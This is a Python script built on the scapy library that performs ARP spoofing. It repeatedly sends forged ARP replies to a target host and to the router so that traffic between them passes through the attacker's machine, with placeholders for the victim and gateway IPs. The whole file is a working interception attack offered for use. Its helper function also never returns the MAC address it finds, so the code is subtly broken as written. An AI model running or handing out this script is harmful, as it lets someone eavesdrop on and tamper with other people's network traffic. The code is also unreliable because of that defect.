import scapy.all as scapy

def spoof(target_ip, target_mac, spoof_ip):
        """
        Send an ARP packet to a target IP and MAC address, spoofing the source IP.
        """
        spoofed_arp_packet = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op=2)
        scapy.send(spoofed_arp_packet, verbose = 0)

def get_mac(ip):
        """
        Returns the MAC address of a network device identified by its IP address.
        """
        arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") /scapy.ARP(pdst=ip)
        reply, _ = scapy.srp(arp_request, timeout = 3, verbose = 0)
        if reply:
            return reply[0][1].src
        return None

def wait_untill_mac_found(ip):
    mac = None
    while not mac:
        mac = get_mac(ip)
        if not mac:
             print("MAC address for {} wasn't found /n".format(ip))


gateway_ip = "<YOUR ROUTER IP>"
target_ip = "<YOUR TARGET IP>"

target_mac = wait_untill_mac_found(target_ip)
gateway_mac = wait_untill_mac_found(gateway_ip)

while True:
    spoof(target_ip=target_ip, target_mac=target_mac, spoof_ip=gateway_ip)
    spoof(target_ip=gateway_ip, target_mac=gateway_mac, spoof_ip=target_ip)
    print("spoofing is active")